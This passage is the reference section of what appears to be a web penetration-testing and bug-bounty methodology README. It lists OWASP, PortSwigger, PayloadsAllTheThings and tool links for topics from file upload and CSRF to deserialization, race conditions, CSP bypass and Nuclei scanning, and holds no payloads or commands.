  - **Checklist**: [Web-Vulnerability-Testing-Checklist/Business-Logic.md](../Web-Vulnerability-Testing-Checklist/Business-Logic.md)
  - **PortSwigger Web Security Academy - Business Logic Vulnerabilities**: https://portswigger.net/web-security/logic-flaws
  - **OWASP WSTG - Business Logic Testing (Latest)**: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README
  - **PayloadsAllTheThings - Business Logic Errors**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors
  - **Recent 2025–2026 write-ups**: Intigriti exploiting logic flaws, Medium/Infosec bug bounty examples (races, e-commerce abuse)
- **33‑File‑Upload**:
  - **OWASP File Upload Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
  - **PortSwigger File Upload Vulnerabilities** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/file‑upload)
  - **PayloadsAllTheThings – File Upload** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
  - **Intigriti Advanced Guide (2024–2025)** – recent bypass techniques and CVEs
  - **Recent CVEs (2025–2026)** – Budibase CVE‑2026‑25737, UI‑only restriction bypasses, parser discrepancies
- **34‑Web‑Cache‑Deception**:
  - **PortSwigger Web Cache Deception** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/web‑cache‑deception) (includes normalization lab)
  - **PayloadsAllTheThings – Web Cache Deception** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception)
  - **2025–2026 Write‑ups** – ChatGPT Wildcard WCD ATO, Medium advanced guides (Reduan, Monika), PortSwigger 2024/2025 top techniques
  - **GitHub: EmadYaY/Comprehensive‑Cache‑Vulnerabilities‑Checklist** – [GitHub](https://github.com/EmadYaY/Comprehensive‑Cache‑Vulnerabilities‑Checklist)
- **35‑CSRF**:
  - **PortSwigger CSRF Cheat Sheet** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/csrf)
  - **OWASP CSRF Prevention Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/Cross‑Site_Request_Forgery_Prevention_Cheat_Sheet.html)
  - **PayloadsAllTheThings – CSRF** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
  - **2025–2026 Write‑ups** – SameSite Lax bypass via method override, cookie refresh attacks, JSON CSRF with text/plain, Intigriti/YesWeHack trends
- **36‑Clickjacking**:
  - **PortSwigger Clickjacking** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/clickjacking)
  - **OWASP Clickjacking Defense Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
  - **PayloadsAllTheThings – Clickjacking** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking)
  - **Recent Write‑ups (2025–2026)** – sandbox/multistep/extension clickjacking (PortSwigger labs, Medium/YesWeHack)
- **37‑Insecure‑Deserialization**:
  - [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)
  - [OWASP Insecure Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
  - [PayloadsAllTheThings – Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
  - Tools: [frohoff/ysoserial](https://github.com/frohoff/ysoserial), [pyn3rd/ysoserial.net](https://github.com/pyn3rd/ysoserial.net), [ambionics/phpggc](https://github.com/ambionics/phpggc)
  - Recent: 2025–2026 write‑ups on gadget rediscovery, .NET legacy chains, blind OOB (Intigriti/HackerOne)
  - **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/Insecure‑Deserialization.md](../Web‑Vulnerability‑Testing‑Checklist/Insecure‑Deserialization.md)
- **38‑OAuth‑Authentication**:
  - [PortSwigger OAuth Authentication](https://portswigger.net/web-security/oauth)
  - [PortSwigger Exploiting OAuth vulnerabilities](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-unprotected-redirect-uri)
  - [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html)
  - [OAuth 2.1 Draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1)
  - [PayloadsAllTheThings – OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)
  - **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/OAuth‑Authentication.md](../Web‑Vulnerability‑Testing‑Checklist/OAuth‑Authentication.md)
- **39‑NoSQL‑Injection**:
  - [PortSwigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
  - [OWASP NoSQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html)
  - [PayloadsAllTheThings – NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
  - HackTricks NoSQL Injection (2025 updates), Intigriti 2025 guide, recent write‑ups (PortSwigger labs, MongoDB 7+ changes)
  - **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/NoSQL‑Injection.md](../Web‑Vulnerability‑Testing‑Checklist/NoSQL‑Injection.md)
- **40‑Race‑Conditions**:
  - [YesWeHack: Ultimate Guide to Race Conditions (2025)](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities)
  - [PortSwigger: Turbo Intruder Research](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
  - [OWASP WSTG: Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing)
  - Recent 2025–2026 write‑ups: InfoSec Write‑ups (coupon races, FinTech 1Rs abuse), Medium/Dev.to (multi‑face races), Cycode 2026 vuln trends
  - **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/Race‑Conditions.md](../Web‑Vulnerability‑Testing‑Checklist/Race‑Conditions.md)
- **41‑WebSockets**:
  - [PortSwigger Testing WebSockets](https://portswigger.net/web-security/websockets)
  - [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
  - [PayloadsAllTheThings – WebSockets](https://github.com/swisskyrepo/PayloadsAllTheThings) (search WebSocket section)
  - Recent: 2025–2026 bounties on WS auth bypass (InfoSec Write‑ups), CSWSH chains, GraphQL sub DoS
  - **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/WebSockets.md](../Web‑Vulnerability‑Testing‑Checklist/WebSockets.md)
- **42‑Directory‑File‑Enumeration**:
  - [OWASP WSTG: Mapping](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/)
  - [PortSwigger: Discovering hidden content](https://portswigger.net/web-security/hidden-content)
  - [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists)
  - **Wfuzz cheatsheet:** [wfuzz.md](../wfuzz.md)
- **43‑CSP‑Bypass**:
  - [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
  - [PortSwigger: CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
  - [Google CSP Evaluator](https://csp‑evaluator.withgoogle.com/)
  - [CSP‑bypass‑wiki (GitHub)](https://github.com/EdOverflow/csp‑bypass‑wiki)
- **44‑Nuclei‑Vuln‑Scanning**:
  - [Nuclei Official Documentation](https://nuclei.projectdiscovery.io/)
  - [Nuclei GitHub Repository](https://github.com/projectdiscovery/nuclei)
  - [Nuclei‑Templates GitHub](https://github.com/projectdiscovery/nuclei-templates)
  - [Nuclei‑Workflows GitHub](https://github.com/projectdiscovery/nuclei-workflows)
- **45‑CVE‑Specific‑Checks**:
  - [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
  - [CVE MITRE](https://cve.mitre.org/)
  - [Exploit‑DB](https://www.exploit‑db.com/)
  - [GitHub Security Advisories](https://github.com/advisories)
  - [Nuclei CVE Templates](https://github.com/projectdiscovery/nuclei‑templates/tree/main/http/cves)
- **46‑Specialized‑Recon**:
  - [OWASP Reconnaissance](https://owasp.org/www‑project‑web‑security‑testing‑guide/latest/4‑Web_Application_Security_Testing/01‑Information_Gathering/)
  - [Shodan Search Guide](https://help.shodan.io/)
  - [Censys Search Syntax](https://support.censys.io/hc/en‑us/articles/360043177092‑Search‑2‑0‑Query‑Syntax)
  - [Bug Bounty Recon Methodology](https://github.com/owasp/API‑Security/blob/master/guides/reconnaissance.md)
- **47‑Nuclei‑Cheat**:
  - [Nuclei Official Documentation](https://nuclei.projectdiscovery.io/)
  - [Nuclei‑Templates GitHub](https://github.com/projectdiscovery/nuclei‑templates)
  - [Nuclei‑Workflows GitHub](https://github.com/projectdiscovery/nuclei‑workflows)

### General References
- **OWASP**: https://owasp.org/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **ProjectDiscovery**: https://projectdiscovery.io/
- **Bug Bounty Platforms**: HackerOne, Bugcrowd, Intigriti
- **Wordlists**: Seclists, Assetnote, fuzzdb
- **Community**: r/netsec, Twitter #bugbounty, Discord servers

---

**Maintainer**: [Manoj Shrestha](https://github.com/manojxshrestha)  
**License**: MIT – Use responsibly, stay ethical.
